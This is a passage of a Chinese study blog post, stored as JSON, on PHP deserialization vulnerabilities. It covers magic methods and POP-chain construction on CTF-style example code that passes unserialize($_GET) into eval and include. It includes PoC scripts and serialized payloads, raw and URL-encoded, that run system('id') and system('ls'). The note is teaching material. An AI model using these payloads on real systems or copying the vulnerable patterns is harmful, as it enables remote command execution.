;\nunset($test-&gt;var);\n?&gt;\n\nvar</code></pre>\n\n<h2 id=\"clone\"><a href=\"#clone\" class=\"headerlink\" title=\"_clone()\"></a>_clone()</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213175800495.png\" alt=\"image-20230213175800495\"></p>\n<p>代码演示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    private $var;\n    public function __clone( )\n    &#123;\n        echo  &quot;__clone test&quot;;\n          &#125;\n&#125;\n$test &#x3D; new User() ;\n$newclass &#x3D; clone($test)\n?&gt;\n__clone test</code></pre>\n\n<h2 id=\"总结-1\"><a href=\"#总结-1\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213175901652.png\" alt=\"image-20230213175901652\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213175914947.png\" alt=\"image-20230213175914947\"></p>\n<h1 id=\"pop链前置知识\"><a href=\"#pop链前置知识\" class=\"headerlink\" title=\"pop链前置知识\"></a>pop链前置知识</h1><h2 id=\"例题代码\"><a href=\"#例题代码\" class=\"headerlink\" title=\"例题代码\"></a>例题代码</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass index &#123;\n    private $test;\n    public function __construct()&#123;\n        $this-&gt;test &#x3D; new normal();\n    &#125;\n    public function __destruct()&#123;\n        $this-&gt;test-&gt;action();\n    &#125;\n&#125;\nclass normal &#123;\n    public function action()&#123;\n        echo &quot;please attack me&quot;;\n    &#125;\n&#125;\nclass evil &#123;\n    var $test2;\n    public function action()&#123;\n        eval($this-&gt;test2);\n    &#125;\n&#125;\nunserialize($_GET[&#39;test&#39;]);\n?&gt;</code></pre>\n\n<h2 id=\"思路-反推法\"><a href=\"#思路-反推法\" class=\"headerlink\" title=\"思路:反推法\"></a>思路:反推法</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213191651775.png\" alt=\"image-20230213191651775\"></p>\n<h2 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213191947129.png\" alt=\"image-20230213191947129\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n&#x2F;&#x2F;highlight_file(__FILE__);\n&#x2F;&#x2F;error_reporting(0);\nclass index &#123;\n    private $test;\n    public function __construct()&#123;\n        $this-&gt;test &#x3D; new evil();\n    &#125;\n&#x2F;&#x2F;    public function __destruct()&#123;\n&#x2F;&#x2F;        $this-&gt;test-&gt;action();\n&#x2F;&#x2F;    &#125;\n&#125;\n&#x2F;&#x2F;class normal &#123;\n&#x2F;&#x2F;    public function action()&#123;\n&#x2F;&#x2F;        echo &quot;please attack me&quot;;\n&#x2F;&#x2F;    &#125;\n&#x2F;&#x2F;&#125;\nclass evil &#123;\n    var $test2&#x3D;&quot;system(&#39;id&#39;);&quot;;\n&#x2F;&#x2F;    public function action()&#123;\n&#x2F;&#x2F;        eval($this-&gt;test2);\n&#x2F;&#x2F;    &#125;\n&#125;\n&#x2F;&#x2F;unserialize($_GET[&#39;test&#39;]);\n\n&#x2F;&#x2F;$a &#x3D; new index();\n&#x2F;&#x2F;echo urlencode(serialize($a));\necho serialize(new index());\n&#x2F;&#x2F;echo urlencode(serialize(new index()));\n?&gt;</code></pre>\n\n<p>payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">O:5:&quot;index&quot;:1:&#123;s:11:&quot; index test&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:13:&quot;system(&#39;id&#39;);&quot;;&#125;&#125;</code></pre>\n\n<p>注意,此时构造出来的payload有一部分需要进行url编码</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213193228721.png\" alt=\"image-20230213193228721\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">O:5:&quot;index&quot;:1:&#123;s:11:&quot;%00index%00test&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:13:&quot;system(&#39;id&#39;);&quot;;&#125;&#125;</code></pre>\n\n<p>也可以直接url输出:<code>echo urlencode(serialize(new index()));</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">O%3A5%3A%22index%22%3A1%3A%7Bs%3A11%3A%22%00index%00test%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A13%3A%22system%28%27id%27%29%3B%22%3B%7D%7D</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213193448430.png\" alt=\"image-20230213193448430\"></p>\n<p><strong>还有另一种写法</strong></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nclass index\n&#123;\n    var $test;\n&#125;\nclass evil\n&#123;\n    var $test2;\n&#125;\n$a &#x3D; new evil();\n$a-&gt;test2&#x3D;&quot;system(&#39;ls&#39;);&quot;;\n$b&#x3D;new index();\n$b-&gt;test&#x3D;$a;\necho serialize($b);\n\n?&gt;</code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">O:5:&quot;index&quot;:1:&#123;s:4:&quot;test&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;&#125;&#125;</code></pre>\n\n<p>但这种方法得到的payload要改一下其中的值</p>\n<p>因为index类中的成员属性$test的修饰符是private,而我写poc的时候改成了public</p>\n<p>所以正确的payload应该是:将第一个test改为”%00index%00test</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">O:5:&quot;index&quot;:1:&#123;s:11:&quot;%00index%00test&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;&#125;&#125;</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213194724093.png\" alt=\"image-20230213194724093\"></p>\n<p><strong>建议修饰符为public时才这么做,不然改起来太麻烦了</strong></p>\n<h2 id=\"魔术方法触发规则\"><a href=\"#魔术方法触发规则\" class=\"headerlink\" title=\"魔术方法触发规则\"></a>魔术方法触发规则</h2><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213195009859.png\" alt=\"image-20230213195009859\"></p>\n<p>演示</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213195719040.png\" alt=\"image-20230213195719040\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213200008809.png\" alt=\"image-20230213200008809\"></p>\n<p>poc</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213200314973.png\" alt=\"image-20230213200314973\"></p>\n<h1 id=\"pop链构造-poc编写\"><a href=\"#pop链构造-poc编写\" class=\"headerlink\" title=\"pop链构造,poc编写\"></a>pop链构造,poc编写</h1><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213200654582.png\" alt=\"image-20230213200654582\"></p>\n<p>例题源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n&#x2F;&#x2F;flag is in flag.php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass Modifier &#123;\n    private $var;\n    public function append($value)\n    &#123;\n        include($value);\n        echo $flag;\n    &#125;\n    public function __invoke()&#123;\n        $this-&gt;append($this-&gt;var);\n    &#125;\n&#125;\n\nclass Show&#123;\n    public $source;\n    public $str;\n    public function __toString()&#123;\n        return $this-&gt;str-&gt;source;\n    &#125;\n    public function __wakeup()&#123;\n        echo $this-&gt;source;\n    &#125;\n&#125;\n\nclass Test&#123;\n    public $p;\n    public function __construct()&#123;\n        $this-&gt;p &#x3D; array();\n    &#125;\n\n    public function __get($key)&#123;\n        $function &#x3D; $this-&gt;p;\n        return $function();\n    &#125;\n&#125;\n\nif(isset($_GET[&#39;pop&#39;]))&#123;\n    unserialize($_GET[&#39;pop&#39;]);\n&#125;\n?&gt;</code></pre>\n\n<p>思路</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213202145219.png\" alt=\"image-20230213202145219\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213203417377.png\" alt=\"image-20230213203417377\"></p>\n<p>poc<img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230213204059394.png\" alt=\"image-20230213204059394\"></p>\n","text":"前言php反序列化漏洞一直是自己的一个弱项，想到上次ctf比赛就是因为web的最后一道题是php反序列化没有思路导致成绩不太理想，特此做个学习笔记以便自己以后查阅 php面向对象基本概念面向对象首先要明确面向对象程序开发的概念 面向过程： 面向过程是一种以“整体事件” 为中心的编...","link":"","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"14 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":18,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"php","slug":"php","count":5,"path":"api/tags/php.json"},{"name":"漏洞","slug":"漏洞","count":5,"path":"api/tags/漏洞.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5\"><span class=\"toc-text\">php面向对象基本概念</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">面向对象</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%B1%BB%E7%9A%84%E5%AE%9A%E4%B9%89\"><span class=\"toc-text\">类的定义</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">类与对象</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%B1%BB%E7%9A%84%E7%BB%93%E6%9E%84\"><span class=\"toc-text\">类的结构</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%B1%BB%E7%9A%84%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">类的内容</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%92%8C%E8%B5%8B%E5%80%BC\"><span class=\"toc-text\">实例化和赋值</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%B1%BB%E7%9A%84%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">类的修饰符介绍</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">类的成员方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">序列化基础知识</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%BD%9C%E7%94%A8\"><span class=\"toc-text\">序列化的作用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A1%A8%E8%BE%BE%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">表达方式</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">反序列化的知识</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%89%B9%E6%80%A7\"><span class=\"toc-text\">特性</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%BD%9C%E7%94%A8\"><span class=\"toc-text\">反序列化的作用</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">反序列化漏洞利用</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">魔术方法简介</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AF%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%EF%BC%9F\"><span class=\"toc-text\">什么是魔术方法？</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%9C%E7%94%A8\"><span class=\"toc-text\">魔术方法的作用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3%E6%9C%BA%E5%88%B6\"><span class=\"toc-text\">魔术方法相关机制</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">魔术方法的简单分类</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#construct\"><span class=\"toc-text\">_construct()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#destruct\"><span class=\"toc-text\">_destruct</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sleep\"><span class=\"toc-text\">_sleep()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wakeup\"><span class=\"toc-text\">_wakeup</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#toString-NaN\"><span class=\"toc-text\">_toString()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#invoke\"><span class=\"toc-text\">_invoke()</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E9%94%99%E8%AF%AF%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">错误调用相关魔术方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#call\"><span class=\"toc-text\">_call()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#callStatic\"><span class=\"toc-text\">_callStatic()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#get\"><span class=\"toc-text\">_get()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#set\"><span class=\"toc-text\">_set()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#isset\"><span class=\"toc-text\">_isset()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#unset\"><span class=\"toc-text\">_unset()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#clone\"><span class=\"toc-text\">_clone()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-1\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pop%E9%93%BE%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">pop链前置知识</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%98%E4%BB%A3%E7%A0%81\"><span class=\"toc-text\">例题代码</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-%E5%8F%8D%E6%8E%A8%E6%B3%95\"><span class=\"toc-text\">思路:反推法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#poc\"><span class=\"toc-text\">poc</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91%E8%A7%84%E5%88%99\"><span class=\"toc-text\">魔术方法触发规则</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pop%E9%93%BE%E6%9E%84%E9%80%A0-poc%E7%BC%96%E5%86%99\"><span class=\"toc-text\">pop链构造,poc编写</span></a></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"metasploitable2靶场渗透","uid":"0b088cb7730fbb88856526a3dd3f4899","slug":"metasploitable2靶场渗透","date":"2023-02-13T01:13:07.350Z","updated":"2023-02-13T02:54:39.737Z","comments":true,"path":"api/articles/metasploitable2靶场渗透.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-72qm39.jpg","text":"前言Metasploitable2 虚拟系统是一个特别制作的ubuntu操作系统，本身设计作为安全工具测试和演示常见漏洞攻击。这个版本的虚拟系统兼容VMware。当虚拟系统启动之后，使用用户名：msfadmin 和密码msfadmin登陆 适用于学习网络安全新手学习 下载地址链接...","link":"","photos":[],"count_time":{"symbolsCount":"2.9k","symbolsTime":"3 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":11,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"vulhub","slug":"vulhub","count":2,"path":"api/tags/vulhub.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}},"next_post":{"title":"DC-5靶机渗透","uid":"a5f05b43c45d522768da0aaf98592442","slug":"DC-5靶机渗透","date":"2023-02-07T02:19:39.442Z","updated":"2023-02-07T09:28:06.280Z","comments":true,"path":"api/articles/DC-5靶机渗透.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-exyyz8.jpg","text":"DC-5靶机渗透全流程一：实验环境kali攻击机：192.168.235.130 dc-5：192.168.235.131 二：信息收集主机发现因为是在内网环境，所以直接用arp-scan arp-scan -l 可以发现目标靶机的ip地址192.168.235.131 端口扫描...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":11,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"DC系列靶机","slug":"DC系列靶机","count":8,"path":"api/tags/DC系列靶机.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}}}